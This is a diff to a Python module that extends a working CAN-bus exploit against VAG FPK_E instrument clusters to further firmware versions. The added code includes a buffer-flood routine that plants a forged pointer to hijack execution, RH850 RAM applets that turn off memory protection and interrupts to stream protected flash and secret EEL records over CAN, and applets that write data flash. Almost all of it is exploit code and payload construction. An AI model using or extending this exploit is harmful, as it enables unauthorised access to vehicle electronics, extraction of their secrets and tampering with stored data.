@@ -1,4 +1,4 @@
-"""Audi / VAG FPK_E (SW 83A, 83A920700E) live CAN transport, level-8 access, RSCAN0 streaming & UDS 0x23 reader."""
+"""VAG / Audi / VW / Škoda FPK_E (SW 83A, 1703, 1711) live CAN transport, level-8 access, RSCAN0 streaming & UDS 0x23 reader."""
 
 from __future__ import annotations
 
@@ -18,7 +18,15 @@ import zlib
 
 import can
 
-from contitool.can.hw_applets import _Rh850Builder, _emit_bfaselr_switch_subroutine
+from contitool.can.hw_applets import (
+    _Rh850Builder,
+    _emit_fpke_bfaselr_switch_subroutine,
+    _emit_fpke_enter,
+    _emit_fpke_leave,
+    build_fpke_dflash_bc_applet,
+    build_fpke_dflash_write_applet,
+    build_fpke_swresa_reset_applet,
+)
 from contitool.can.transport import (
     BLOCK_SEND_TIMEOUT,
     FRAME_SEND_TIMEOUT,
@@ -46,7 +54,15 @@ from contitool.core.fpke import (
     analyze_fpke_dflash,
     analyze_fpke_extra_area,
     build_fd11_proof,
+    eel_append_records,
+    eel_faci_word_mask,
+    eel_parse_pool,
+    eel_read_record_any,
+    extract_fpke_eel_updates,
+    fpke_eel_layout,
     is_fpke_dflash,
+    normalize_fpke_dflash_for_faci,
+    summarize_fpke_dflash_changes,
     validate_fpke_extra_area,
 )
 from contitool.i18n import tr
@@ -79,11 +95,28 @@ FPKE_APPLET_ENTRY = 0xFEDF1800
 FPKE_SOURCE_PARAM = 0xFEDF1900
 FPKE_RESULT_ADDR = 0xFEDF1A00
 FPKE_RESULT_SIZE = 260
+FPKE_BC_RESULT_SIZE = 268
 FPKE_MARKER_ADDR = 0xFEDF1B00
 FPKE_SAVED_MPUA3_ADDR = 0xFEDF1B10
 FPKE_SAVED_RETURN = 0xFEDC3B78
 FPKE_CALLER_RETURN = 0x0009CF0E
 FPKE_CALLER_R29 = 0xFEDF31C8
+
+# SW 1703 / SW 1711 (5E0920790A, VW / Škoda FPK_E) block-stream, CanTp ch-3 & MPU[1] SX RAM addresses
+FPKE_1703_BLOCK_BUFFER = 0xFEDEBEB4
+FPKE_1703_CANTP_PTR = 0xFEDEDCD4
+FPKE_1703_LEVEL_ADDRESS = 0xFEDF5A1F
+FPKE_1703_FORGED_PTR = FPKE_1703_LEVEL_ADDRESS - 6  # 0xFEDF5A19
+FPKE_1703_POINTER_FRAME = (FPKE_1703_CANTP_PTR - FPKE_1703_BLOCK_BUFFER) // 8  # 964
+FPKE_1703_APPLET_ENTRY = 0xFEDF4400
+FPKE_1703_SOURCE_PARAM = 0xFEDF4500
+FPKE_1703_RESULT_ADDR = 0xFEDF4600
+FPKE_1703_MARKER_ADDR = 0xFEDF4700
+FPKE_1703_SAVED_MPUA3_ADDR = 0xFEDF4710
+FPKE_1703_SAVED_RETURN = 0xFEDC3978
+FPKE_1703_CALLER_RETURN = 0x000AA714
+FPKE_1711_CALLER_RETURN = 0x000AA748
+FPKE_1703_CALLER_R29 = 0xFEDF5AC8
 
 BFASELR_ADDR = 0xFFC59008
 IDAUTH_ADDR = 0xFFA08000
@@ -108,7 +141,7 @@ FPKE_1703_RAM_EEL67_ADDR = 0xFEDF5306      # 37 B: RAM mirror of EEL 0x67 on SW 
 FPKE_1703_RAM_EEL68_ADDR = 0xFEDF52B8      # 76 B: RAM mirror of EEL 0x68 on SW 1703
 FPKE_1703_RAM_EEL69_ADDR = 0xFEDF4A58      # 32 B: RAM mirror of EEL 0x69 (S0 || S1) on SW 1703
 
-FPKE_STREAM_CHUNK_BYTES = 2048  # 256 x 8-byte CAN frames (~64 ms burst on 0x6F1)
+FPKE_STREAM_CHUNK_BYTES = 1024  # 128 x 8-byte CAN frames (~32 ms paced burst: ~26 KB/s, 3.6x watchdog margin & SLCAN-safe)
 
 # Keepalive frames (2 ms apart, ~200 ms cycle; 0x3C0 KL_S+KL15=0x03, 0x663 group 5 master for MFL 0x5BF)
 FPKE_KEEPALIVE_PATTERN: tuple[tuple[int, bytes], ...] = (
@@ -246,6 +279,123 @@ FPKE_TEMPLATE_B85 = (
 )
 FPKE_TEMPLATE = zlib.decompress(base64.b85decode("".join(FPKE_TEMPLATE_B85.split())))
 
+# 8192-byte (1024 x 8B) CAN-descriptor-preserving block-stream template for VW/Škoda SW 1703 / 1711
+FPKE_1703_TEMPLATE_SHA256 = "8f567634e79fff8d60867c629bf9a81361510482c84090edfb93d43a2017a95c"
+FPKE_1703_TEMPLATE_B85 = (
+    "c-rlmUu+ab9LHyGx7Xg$>$TTX3aCY(6e=ou6j70u(kg0&R$E0x<xjzaRV$((V!4n$)Wio9{}iH$Xn4TH5KN5vfRSj`QUOWyf\n"
+    "du6GP?ZN08e+_u!mcyBd)M!NdzFHKB=Eaz=R5n^{q64T+<fPzc@v}6jjK0wh^uimuErG^nsy>nl_Bl-OwE_vci7(N6W+R8YR\n"
+    "PleIcifxRxNdWj@)wdqn%l@Ec)iSX?(4Ve4z(I5h3#AzOoD<6q_koGLK&6B&~N@onleLW=55BAEz>$vPH7wi5ZgVvYhXC&g)\n"
+    "R;`EqUMmrP|?=(3$~y-dkuI?>ti(L0LmOR_fkOp@gSJ4P%d<tW|BnUJi)h>0Ru^;J3hlFwJr<$b<v)h=PDU1mt8%XSG1e^yY\n"
+    "oi)z#YA>LK2R<Z(7t&dj?y-q%dDnrpu_3X`(<ySd50}-eE+<m@w$!d51WEGn+GboP<tLsIa>+O)t*s6<&(6wxNUQn?-hwW9Y\n"
+    "N|*1(&_+oXfc8An<!#Rh^qW87`BdbC&i&TQ3P4XMHX8H-Vuhfah>ZaqBUS|ZJz`@)e?e><=%0y=2i;HX8qnF_dD*p~rxLpkb\n"
+    "TzSJ(94KT0KJ*m^`N&An+W<-Vv|50CN>%LAH+&PXMOKwQ!odyQqYyerh;BdY#Qi|#L7UwMeGL9dx%X3eSp}FpidCH3AEAeWj\n"
+    "EvdA~pl`9AdYCUQFy((CdjsLBBz4Cg_iem4ogkHVbqgvD>h+-^*s>cZ1mNcpR}iKsOM(6Lc%FIiO!Bb{FVf#O8wTB31#qmsl\n"
+    "m})5PZCIMm~1RrpSb%?DjatQvF+u^P}F#O?;Ylh{3=_YqqF`WUf$K_`gahhzQ^UUonBe`2+$i9G<inb<<m?Zg&=-a)Jm^j>2\n"
+    "1ppOuH5dDwXL+F18ysQDo8e)yu?!+EO|0DJY`X8~y=zqi>MgJqV1pSZLW9WaxmZJY1^s>isTqpJf_HklQqW=+FhW<xvIr<;5\n"
+    "73hD&R-*qAYeN4cwhI04ke97S|0DJkjwi&Lv2BU1LH{GR7X6Rd)98Q1TG0Q9J%j#7>{;}`AHD23^gm*)ICc|z9{Vw|b?AS@U\n"
+    "O@jNwjTYD*o)|Y#9l)GBenr6hrMhg`X8~E(f^2T!ZCx`E7*R-HlzO$dlmhUSR48uF$?{V*!hL73;6NqQ$HCs`)Ak%i&)q$Ol\n"
+    "|13|NX??udH*vSZ}c@=jbteJWQtVS7}W7$J%lxoH%KjCx_45@4aTdd!{p~FbCV)8i-q_Wto|YxMjuhoMFerkw$h=Uh&zEX&h\n"
+    "m$GOGX8dfKwP*s?9Dbp+?Gt#Fp3a)wP-*C^g}yUP1^vu29z{mzWcINx;+`A*WzD<*uFX1?dXU*2O1Gj55C6v5!`Q5PZYFYTW\n"
+    "cZ;WMjclYgaerZ>nn&dsgvW7gS&@S2XQ_h7*5*1mO&3c-3);Q;s=B2rFO<c}Vk>RYf4Zd`DByiWKg!sS}4f9k_&m9x87x|KF\n"
+    "Vtu8FzpWNZ3I;gAS)_`IUdu`xntZm~@eL7aV%x|bt<`<WF_o>tvvS~efVMVIJ=Y!w&9wdEjPoir`*kKu;nBzj_X&^UV=xb2!\n"
+    "Bd;*IX22UG`f#;R~an1gAS#acc;D7Yx!5uCtrR8R!aK_%fC%h2keg~YnrU7RWxIm@Vi?&<af4Iy-<Z;?sLP7(?v;1NvRC^x5\n"
+    "Qs6YyVeIkXz81mIhOM!@+PktPTH_`E^O$9Lc`_8bzXcRzS|l`=#os35et6{V5hmGiUc-+_p*ujqbW^t#F2l5m;vOe>Qb64@e\n"
+    "!QJIUXkUHIGnnzha4iSmIj`^Ii+H1vV^_SaS%?ftN)veXc<DTbK6t5B?oY_flU4Ve@Ae4?8^$yQo4`rz`TtLE0K^5Am&M&xI\n"
+    "jysV+ykCT->&e?LDEtHe<58J+({{\n"
+)
+FPKE_1703_TEMPLATE = zlib.decompress(base64.b85decode("".join(FPKE_1703_TEMPLATE_B85.split())))
+
+FPKE_PROFILES: dict[str, dict[str, Any]] = {
+    "83a": {
+        "name": "83a",
+        "target_label": "Audi FPK_E SW 83A (83A920700E)",
+        "block_buffer": FPKE_BLOCK_BUFFER,
+        "cantp_channel": 9,
+        "cantp_ptr": FPKE_CANTP_CH9_PTR,
+        "pointer_frame": FPKE_POINTER_FRAME,
+        "level_address": FPKE_LEVEL_ADDRESS,
+        "forged_ptr": FPKE_FORGED_PTR,
+        "template": FPKE_TEMPLATE,
+        "template_sha256": FPKE_TEMPLATE_SHA256,
+        "applet_entry": FPKE_APPLET_ENTRY,
+        "source_param": FPKE_SOURCE_PARAM,
+        "result_addr": FPKE_RESULT_ADDR,
+        "marker_addr": FPKE_MARKER_ADDR,
+        "saved_mpua3_addr": FPKE_SAVED_MPUA3_ADDR,
+        "saved_return": FPKE_SAVED_RETURN,
+        "caller_return": FPKE_CALLER_RETURN,
+        "caller_r29": FPKE_CALLER_R29,
+    },
+    "1703": {
+        "name": "1703",
+        "target_label": "VW/Škoda FPK_E SW 1703 (5E0920790A)",
+        "block_buffer": FPKE_1703_BLOCK_BUFFER,
+        "cantp_channel": 3,
+        "cantp_ptr": FPKE_1703_CANTP_PTR,
+        "pointer_frame": FPKE_1703_POINTER_FRAME,
+        "level_address": FPKE_1703_LEVEL_ADDRESS,
+        "forged_ptr": FPKE_1703_FORGED_PTR,
+        "template": FPKE_1703_TEMPLATE,
+        "template_sha256": FPKE_1703_TEMPLATE_SHA256,
+        "applet_entry": FPKE_1703_APPLET_ENTRY,
+        "source_param": FPKE_1703_SOURCE_PARAM,
+        "result_addr": FPKE_1703_RESULT_ADDR,
+        "marker_addr": FPKE_1703_MARKER_ADDR,
+        "saved_mpua3_addr": FPKE_1703_SAVED_MPUA3_ADDR,
+        "saved_return": FPKE_1703_SAVED_RETURN,
+        "caller_return": FPKE_1703_CALLER_RETURN,
+        "caller_r29": FPKE_1703_CALLER_R29,
+    },
+    "1711": {
+        "name": "1711",
+        "target_label": "VW/Škoda FPK_E SW 1711 (5E0920790A)",
+        "block_buffer": FPKE_1703_BLOCK_BUFFER,
+        "cantp_channel": 3,
+        "cantp_ptr": FPKE_1703_CANTP_PTR,
+        "pointer_frame": FPKE_1703_POINTER_FRAME,
+        "level_address": FPKE_1703_LEVEL_ADDRESS,
+        "forged_ptr": FPKE_1703_FORGED_PTR,
+        "template": FPKE_1703_TEMPLATE,
+        "template_sha256": FPKE_1703_TEMPLATE_SHA256,
+        "applet_entry": FPKE_1703_APPLET_ENTRY,
+        "source_param": FPKE_1703_SOURCE_PARAM,
+        "result_addr": FPKE_1703_RESULT_ADDR,
+        "marker_addr": FPKE_1703_MARKER_ADDR,
+        "saved_mpua3_addr": FPKE_1703_SAVED_MPUA3_ADDR,
+        "saved_return": FPKE_1703_SAVED_RETURN,
+        "caller_return": FPKE_1711_CALLER_RETURN,
+        "caller_r29": FPKE_1703_CALLER_R29,
+    },
+}
+
+
+def fpke_get_profile(profile: str | None = None) -> dict[str, Any]:
+    """Return the FPK_E address & applet profile dict for `'83a'`, `'1703'`, or `'1711'`."""
+    key = (profile or "83a").strip().lower()
+    if key not in FPKE_PROFILES:
+        raise ValueError(f"Unsupported FPK_E firmware profile: {profile!r} (expected one of {tuple(FPKE_PROFILES)})")
+    return FPKE_PROFILES[key]
+
+
+def fpke_detect_sw_profile(
+    ident: list[dict[str, str]] | None = None,
+    *,
+    f189: str | None = None,
+    f187: str | None = None,
+) -> str:
+    """Detect FPK_E software profile (`'83a'`, `'1703'`, or `'1711'`) from UDS identification DIDs (`F189`, `F187`, `F191`)."""
+    vals = {str(it.get("did", "")).upper(): str(it.get("value", "")).strip() for it in (ident or [])}
+    sw = "".join((f189 if f189 is not None else vals.get("F189", "")).split()).upper()
+    pn = "".join((f187 if f187 is not None else (vals.get("F187") or vals.get("F191") or "")).split()).upper()
+    if sw.startswith("1711"):
+        return "1711"
+    if sw.startswith("1703") or sw.startswith("17") or sw.startswith("16"):
+        return "1703"
+    if pn.startswith(("5E0", "5G0", "5G1", "5NA", "3G0", "565", "5F0", "17A", "2GA", "6VA")):
+        return "1703"
+    return "83a"
+
+
 # Hardware-verified 256-byte RAM-buffer reader applets (PSW ID|NP save/restore)
 FPKE_BFLASH_BUF_PAYLOAD_SHA256 = "310e3e70aede2e2ca80368f55cb8c7087d9ac611843e205dff87b360a701b2fb"
 FPKE_BFLASH_BUF_PAYLOAD = (
@@ -273,65 +423,149 @@ FPKE_UFLASH_BUF_PAYLOAD = bytes.fromhex(
 )
 
 
-def build_fpke_can_stream_applet(mode: str = "direct") -> bytes:
-    """Build RH850 SX RAM applet (`0xFEDF1800`) that streams memory in 8-byte CAN frames on `0x6F1` via `RSCAN0` `TM17`.
+def build_fpke_bflash_buf_applet(profile: str = "83a") -> bytes:
+    """Return 256-byte BFlash / Extra Area RAM-buffer reader applet for `profile` (`'83a'`, `'1703'`, or `'1711'`)."""
+    prof = fpke_get_profile(profile)
+    if prof["name"] == "83a":
+        return FPKE_BFLASH_BUF_PAYLOAD
+    src_param = int(prof["source_param"])
+    result_addr = int(prof["result_addr"])
+    marker_addr = int(prof["marker_addr"])
+    caller_r29 = int(prof["caller_r29"])
+    caller_return = int(prof["caller_return"])
 
-    Parameters at `0xFEDF1900`:
+    b = _Rh850Builder()
+    b.stsr(5, 18, 0)              # r18 = PSW
+    b.ori(0x00A0, 18, 6)          # PSW.ID | PSW.NP (blocks EI and FE interrupts while BFASELR=1)
+    b.ldsr(6, 5, 0)
+    b.mov_imm5(1, 6)
+    b.jarl("SUB_SWITCH_BFLASH")
+    b.mov_imm(src_param, 14)
+    b.ld_w(0, 14, 8)              # r8 = source address
+    b.mov_imm(result_addr, 9)     # r9 = 256-byte destination buffer
+    b.mov_u16(64, 7)              # 64 x 4 B = 256 B
+    b.label("COPY_LOOP")
+    b.ld_w(0, 8, 6)
+    b.st_w(6, 0, 9)
+    b.add_imm5(4, 8)
+    b.add_imm5(4, 9)
+    b.add_imm5(-1, 7)
+    b.bne_short("COPY_LOOP")
+    b.mov_imm5(0, 6)
+    b.jarl("SUB_SWITCH_BFLASH")
+    b.mov_imm(0x4E414353, 7)      # "SCAN"
+    b.st_w(7, marker_addr - src_param, 14)
+    b.mov_imm(caller_r29, 29)
+    _emit_fpke_leave(b, caller_return=caller_return)
+    _emit_fpke_bfaselr_switch_subroutine(b, "SUB_SWITCH_BFLASH")
+    payload = b.build()
+    if len(payload) > 0x100:
+        raise RuntimeError(f"FPK_E bflash buffer applet ({prof['name']}) size {len(payload)} exceeds 256-byte slot")
+    return payload
+
+
+def build_fpke_uflash_buf_applet(profile: str = "83a") -> bytes:
+    """Return 256-byte UFlash RAM-buffer reader applet (`MPM` SV bypass) for `profile` (`'83a'`, `'1703'`, or `'1711'`)."""
+    prof = fpke_get_profile(profile)
+    src_param = int(prof["source_param"])
+    result_addr = int(prof["result_addr"])
+    marker_addr = int(prof["marker_addr"])
+    caller_r29 = int(prof["caller_r29"])
+    caller_return = int(prof["caller_return"])
+
+    b = _Rh850Builder()
+    b.stsr(5, 18, 0)              # r18 = PSW
+    b.ori(0x00A0, 18, 6)          # PSW.ID | PSW.NP
+    b.ldsr(6, 5, 0)
+    b.stsr(0, 19, 5)              # r19 = MPM (SR 0, sel 5)
+    b.andi(0xFFFC, 19, 6)         # clear MPE & SVP (disable MPU checks in SV mode)
+    b.ldsr(6, 0, 5)
+    b.synci()
+    b.syncp()
+    b.mov_imm(src_param, 14)
+    b.ld_w(0, 14, 8)              # r8 = source address
+    b.mov_imm(result_addr, 9)     # r9 = 256-byte destination buffer
+    b.mov_u16(64, 7)              # 64 x 4 B = 256 B
+    b.label("COPY_LOOP")
+    b.ld_w(0, 8, 6)
+    b.st_w(6, 0, 9)
+    b.add_imm5(4, 8)
+    b.add_imm5(4, 9)
+    b.add_imm5(-1, 7)
+    b.bne_short("COPY_LOOP")
+    b.ldsr(19, 0, 5)              # restore MPM
+    b.synci()
+    b.syncp()
+    b.mov_imm(0x4E414353, 7)      # "SCAN"
+    b.st_w(7, marker_addr - src_param, 14)
+    b.mov_imm(caller_r29, 29)
+    _emit_fpke_leave(b, caller_return=caller_return)
+    payload = b.build()
+    if len(payload) > 0x100:
+        raise RuntimeError(f"FPK_E uflash buffer applet ({prof['name']}) size {len(payload)} exceeds 256-byte slot")
+    return payload
+
+
+def build_fpke_can_stream_applet(mode: str = "direct", *, profile: str = "83a") -> bytes:
+    """Build RH850 SX RAM applet (`0xFEDF1800` on 83A / `0xFEDF4400` on 1703 & 1711) that streams memory on `0x6F1` via `RSCAN0` `TM17`.
+
+    Parameters at `source_param` (`0xFEDF1900` on 83A / `0xFEDF4500` on 1703 & 1711):
       - `+0x00` (`u32` LE): `source_addr`
-      - `+0x04` (`u32` LE): `frame_count` (number of 8-byte frames to transmit on `0x6F1`, e.g. 256 = 2 KiB)
+      - `+0x04` (`u32` LE): `frame_count` (number of 8-byte frames to transmit on `0x6F1`, e.g. 32 = 256 B)
     Modes:
       - `'direct'`: normal mapping (CodeFlash `0x00000000`, DataFlash `0xFF200000`, RAM)
-      - `'bflash'`: switches `BFASELR = 1` before streaming and restores `BFASELR = 0` + I-cache/CFCNT afterwards
-      - `'uflash'`: saves `MPUA3`, expands `MPUA3 = 0x01007FFF` before streaming, and restores `MPUA3` afterwards
-    Services `WDTA1` (`0xFFED1004 = 0xAC - [0xFFED1008]`) every frame and returns cleanly to `0x0009CF0E` (`7D` on `0x77E`).
+      - `'bflash'`: switches `BFASELR = 1` before streaming and restores `BFASELR = 0` + I-cache/CDBCR afterwards
+      - `'uflash'`: saves `MPM`, clears `MPE|SVP` before streaming, and restores `MPM` afterwards
+    Uses only caller-saved registers `r6..r19` (`r20..r28` remain untouched) and returns cleanly to `caller_return`.
     """
     if mode not in ("direct", "bflash", "uflash"):
         raise ValueError(f"Unsupported stream applet mode: {mode}")
+    prof = fpke_get_profile(profile)
+    src_param = int(prof["source_param"])
+    marker_addr = int(prof["marker_addr"])
+    caller_r29 = int(prof["caller_r29"])
+    caller_return = int(prof["caller_return"])
 
     b = _Rh850Builder()
-    # 1. Save PSW into r21 and set PSW.ID | PSW.NP (0xA0)
-    b._emit(bytes.fromhex("f5a7400020b6a00015b1f6a72000"))
+    # 1. Save PSW into caller-saved r18 and disable interrupts (DI)
+    _emit_fpke_enter(b)
 
     if mode == "bflash":
         b.mov_imm5(1, 6)
         b.jarl("SUB_SWITCH_BFLASH")
     elif mode == "uflash":
-        # Save MPUA3 to 0xFEDF1B10 and expand MPUA3 to 0x01007FFF
-        b._emit(bytes.fromhex("e76f20302906101bdffe693f01002706ff7f0001e76f40301c001f00"))
+        # Save MPM (SR 0, sel 5) in caller-saved r19 and clear MPE|SVP during UFlash streaming
+        b.stsr(0, 19, 5)
+        b.andi(0xFFFC, 19, 6)
+        b.ldsr(6, 0, 5)
+        b.synci()
+        b.syncp()
 
-    # 2. Load source_addr (r8) and frame_count (r9) from 0xFEDF1900
-    b.mov_imm(FPKE_SOURCE_PARAM, 20)
-    b.ld_w(0, 20, 8)
-    b.ld_w(4, 20, 9)
+    # 2. Load source_addr (r8) and frame_count (r9) from source_param (kept in caller-saved r15)
+    b.mov_imm(src_param, 15)
+    b.ld_w(0, 15, 8)
+    b.ld_w(4, 15, 9)
 
     # 3. Configure RSCAN0 Channel 1 TX buffer 1 (TM17, p = 17: TMIE17 == 0)
-    b.movhi(0xFFD0, 0, 20)  # r20 = 0xFFD00000
-    b.st_b(0, 0x02E1, 20)   # TMSTS17 = 0 (clear TMTRF)
+    b.movhi(0xFFD0, 0, 14)  # r14 = 0xFFD00000
+    b.st_b(0, 0x02E1, 14)   # TMSTS17 = 0 (clear TMTRF)
     b.mov_u16(FPKE_STREAM_RX_ID, 6)
-    b.st_w(6, 0x1110, 20)   # TMID17 = 0x6F1 (11-bit standard frame)
+    b.st_w(6, 0x1110, 14)   # TMID17 = 0x6F1 (11-bit standard frame)
     b.movhi(0x8000, 0, 6)   # r6 = 0x80000000 (DLC = 8)
-    b.st_w(6, 0x1114, 20)   # TMPTR17 = DLC 8
+    b.st_w(6, 0x1114, 14)   # TMPTR17 = DLC 8
 
-    # 4. Stream loop: kick WDTA1, write TMDF0/1_17, set TMC17.TMTR=1, wait TMSTS17 & 6 != 0, clear TMSTS17
-    b.movhi(0xFFED, 0, 11)  # r11 = 0xFFED0000 (WDTA1 at +0x1000)
-    b.mov_u16(0x00AC, 13)   # r13 = 0xAC
-
+    # 4. Stream loop: write TMDF0/1_17, set TMC17.TMTR=1, wait TMSTS17 & 6 != 0, clear TMSTS17, ~30 us SLCAN gap
     b.label("FRAME_LOOP")
-    # Kick WDTA1 (VAC mode: WDTA1EVAC = 0xAC - WDTA1REF)
-    b.ld_bu(0x1008, 11, 12)
-    b.subr(13, 12)
-    b.st_b(12, 0x1004, 11)
-
     b.ld_w(0, 8, 6)
     b.ld_w(4, 8, 7)
-    b.st_w(6, 0x1118, 20)   # TMDF0_17
-    b.st_w(7, 0x111C, 20)   # TMDF1_17
+    b.st_w(6, 0x1118, 14)   # TMDF0_17
+    b.st_w(7, 0x111C, 14)   # TMDF1_17
     b.mov_imm5(1, 6)
-    b.st_b(6, 0x0261, 20)   # TMC17 = 1 (TMTR)
+    b.st_b(6, 0x0261, 14)   # TMC17 = 1 (TMTR)
 
     b.movhi(0x0004, 0, 6)   # timeout counter r6 = 0x40000
     b.label("WAIT_TX")
-    b.ld_bu(0x02E1, 20, 7)  # TMSTS17
+    b.ld_bu(0x02E1, 14, 7)  # TMSTS17
     b.andi(0x0006, 7, 7)    # TMTRF bits 2:1
     b.bne_short("TX_DONE")
     b.add_imm5(-1, 6)
@@ -339,41 +573,56 @@ def build_fpke_can_stream_applet(mode: str = "direct") -> bytes:
     b.br_short("STREAM_END")
 
     b.label("TX_DONE")
-    b.st_b(0, 0x02E1, 20)   # clear TMSTS17 (TMTRF := 00)
+    b.st_b(0, 0x02E1, 14)   # clear TMSTS17 (TMTRF := 00)
+    # ~30 us inter-frame gap at 120 MHz (128 frames = 1 KiB finish in ~32 ms: 3.6x watchdog margin & zero SLCAN drops)
+    b.mov_u16(1200, 6)
+    b.label("TX_GAP")
+    b.add_imm5(-1, 6)
+    b.bne_short("TX_GAP")
     b.add_imm5(8, 8)
     b.add_imm5(-1, 9)
     b.bne_short("FRAME_LOOP")
 
     b.label("STREAM_END")
-    b.st_b(0, 0x02E1, 20)
+    b.st_b(0, 0x02E1, 14)
+    # Persist auto-incremented next source_addr (r8) to source_param to eliminate per-chunk 0x3D parameter writes
+    b.st_w(8, 0, 15)
     if mode == "bflash":
         b.mov_imm5(0, 6)
         b.jarl("SUB_SWITCH_BFLASH")
     elif mode == "uflash":
-        b._emit(bytes.fromhex("2906101bdffe293f0100e76f40301c001f00"))
+        b.ldsr(19, 0, 5)
+        b.synci()
+        b.syncp()
 
-    # Write "SCAN" marker to 0xFEDF1B00 and return to 0x0009CF0E with r29=0xFEDF31C8, r10=0, PSW=r21
+    # Write "SCAN" marker to marker_addr and return to caller_return with r29=caller_r29, r10=0, PSW=r18
     b.mov_imm(0x4E414353, 7)
-    b.mov_imm(FPKE_MARKER_ADDR, 9)
-    b.st_w(7, 0, 9)
-    b._emit(bytes.fromhex("3d06c831dffe3f060ecf09000052f5a720007f00"))
+    b.st_w(7, marker_addr - src_param, 15)
+    b.mov_imm(caller_r29, 29)
+    _emit_fpke_leave(b, caller_return=caller_return)
 
     if mode == "bflash":
-        _emit_bfaselr_switch_subroutine(b, "SUB_SWITCH_BFLASH")
+        _emit_fpke_bfaselr_switch_subroutine(b, "SUB_SWITCH_BFLASH")
 
     payload = b.build()
     if len(payload) > 0x100:
-        raise RuntimeError(f"FPK_E stream applet ({mode}) size {len(payload)} exceeds 256-byte 0xFEDF1800 slot")
+        raise RuntimeError(f"FPK_E stream applet ({mode}) size {len(payload)} exceeds 256-byte slot")
     return payload
 
 
-def flood_payload(index: int) -> bytes:
-    """Return 8-byte payload for block-stream frame `index` (0..1023), patching frame 1019 with `FORGED_PTR`."""
-    data = bytearray(FPKE_TEMPLATE[index * 8 : index * 8 + 8])
+def flood_payload(index: int, *, profile: str = "83a") -> bytes:
+    """Return 8-byte payload for block-stream frame `index` (0..1023), patching `pointer_frame` with `forged_ptr`."""
+    prof = fpke_get_profile(profile)
+    tpl = prof["template"]
+    ptr_frame = int(prof["pointer_frame"])
+    forged_ptr = int(prof["forged_ptr"])
+    data = bytearray(tpl[index * 8 : index * 8 + 8])
     if len(data) != 8:
         raise ValueError(f"Invalid flood frame index: {index}")
-    if index == FPKE_POINTER_FRAME:
-        data[:4] = FPKE_FORGED_PTR.to_bytes(4, "little")
+    if index == ptr_frame:
+        data[:4] = forged_ptr.to_bytes(4, "little")
+    elif prof["name"] in ("1703", "1711") and index == ptr_frame - 1:
+        data[4:8] = forged_ptr.to_bytes(4, "little")
     return bytes(data)
 
 
@@ -385,23 +634,60 @@ def partition_chunks(size: int, chunk: int) -> list[int]:
 
 
 def verify_fpke_self_tests() -> None:
-    """Deterministic offline consistency checks for FPK_E template, pointers, applets, and AES-128-CBC."""
+    """Deterministic offline consistency checks for FPK_E templates, pointers, applets (83A / 1703 / 1711), and AES-128-CBC."""
     if len(FPKE_TEMPLATE) != 0x2000:
         raise RuntimeError(f"FPK_E template length mismatch: {len(FPKE_TEMPLATE)} != 8192")
     if hashlib.sha256(FPKE_TEMPLATE).hexdigest() != FPKE_TEMPLATE_SHA256:
         raise RuntimeError("FPK_E template SHA-256 mismatch")
+    if len(FPKE_1703_TEMPLATE) != 0x2000:
+        raise RuntimeError(f"FPK_E 1703 template length mismatch: {len(FPKE_1703_TEMPLATE)} != 8192")
+    if hashlib.sha256(FPKE_1703_TEMPLATE).hexdigest() != FPKE_1703_TEMPLATE_SHA256:
+        raise RuntimeError("FPK_E 1703 template SHA-256 mismatch")
     if FPKE_POINTER_FRAME != 1019 or FPKE_BLOCK_BUFFER + 8 * FPKE_POINTER_FRAME != FPKE_CANTP_CH9_PTR:
         raise RuntimeError("FPK_E CanTp channel-9 pointer frame calculation mismatch")
+    if FPKE_1703_POINTER_FRAME != 964 or FPKE_1703_BLOCK_BUFFER + 8 * FPKE_1703_POINTER_FRAME != FPKE_1703_CANTP_PTR:
+        raise RuntimeError("FPK_E 1703 CanTp channel-3 pointer frame calculation mismatch")
     if flood_payload(FPKE_POINTER_FRAME) != bytes.fromhex("0d31dffe00000000"):
         raise RuntimeError("FPK_E frame 1019 forged pointer bytes mismatch")
+    if flood_payload(FPKE_1703_POINTER_FRAME, profile="1703") != bytes.fromhex("195adffee55adffe"):
+        raise RuntimeError("FPK_E 1703 frame 964 forged pointer bytes mismatch")
     if len(FPKE_BFLASH_BUF_PAYLOAD) != 234 or hashlib.sha256(FPKE_BFLASH_BUF_PAYLOAD).hexdigest() != FPKE_BFLASH_BUF_PAYLOAD_SHA256:
         raise RuntimeError("FPK_E BFlash buffer applet SHA-256 mismatch")
     if len(FPKE_UFLASH_BUF_PAYLOAD) != 132 or hashlib.sha256(FPKE_UFLASH_BUF_PAYLOAD).hexdigest() != FPKE_UFLASH_BUF_PAYLOAD_SHA256:
         raise RuntimeError("FPK_E UFlash buffer applet SHA-256 mismatch")
-    for mode in ("direct", "bflash", "uflash"):
-        stream_app = build_fpke_can_stream_applet(mode)
-        if not (64 <= len(stream_app) <= 256):
-            raise RuntimeError(f"Invalid stream applet size for {mode}: {len(stream_app)}")
+    for prof_name, prof in FPKE_PROFILES.items():
+        bf_app = build_fpke_bflash_buf_applet(prof_name)
+        if not (64 <= len(bf_app) <= 256) or (prof_name == "83a" and len(bf_app) != 234):
+            raise RuntimeError(f"Invalid BFlash buffer applet size for {prof_name}: {len(bf_app)}")
+        uf_app = build_fpke_uflash_buf_applet(prof_name)
+        if not (64 <= len(uf_app) <= 256):
+            raise RuntimeError(f"Invalid UFlash buffer applet size for {prof_name}: {len(uf_app)}")
+        for mode in ("direct", "bflash", "uflash"):
+            stream_app = build_fpke_can_stream_applet(mode, profile=prof_name)
+            if not (64 <= len(stream_app) <= 256):
+                raise RuntimeError(f"Invalid stream applet size for {prof_name}/{mode}: {len(stream_app)}")
+        for app_name, app_blob, max_sz in (
+            (
+                "dflash_bc",
+                build_fpke_dflash_bc_applet(
+                    applet_entry=prof["applet_entry"],
+                    caller_return=prof["caller_return"],
+                    caller_r29=prof["caller_r29"],
+                ),
+                256,
+            ),
+            (
+                "dflash_write",
+                build_fpke_dflash_write_applet(
+                    applet_entry=prof["applet_entry"],
+                    caller_return=prof["caller_return"],
+                ),
+                256,
+            ),
+            ("swresa_reset", build_fpke_swresa_reset_applet(), 64),
+        ):
+            if not (16 <= len(app_blob) <= max_sz):
+                raise RuntimeError(f"Invalid {prof_name}/{app_name} applet size: {len(app_blob)} (max {max_sz})")
     chunks = partition_chunks(FPKE_DFLASH_SIZE, 500)
     if len(chunks) != 132 or sum(chunks) != FPKE_DFLASH_SIZE or chunks[-1] != 36:
         raise RuntimeError("FPK_E DFlash partition check failed")
@@ -454,6 +740,7 @@ class FpkeCanLink:
         tty_baudrate: int = 115_200,
         log_path: Path | None = None,
         bus: Any | None = None,
+        sw_profile: str | None = None,
     ) -> None:
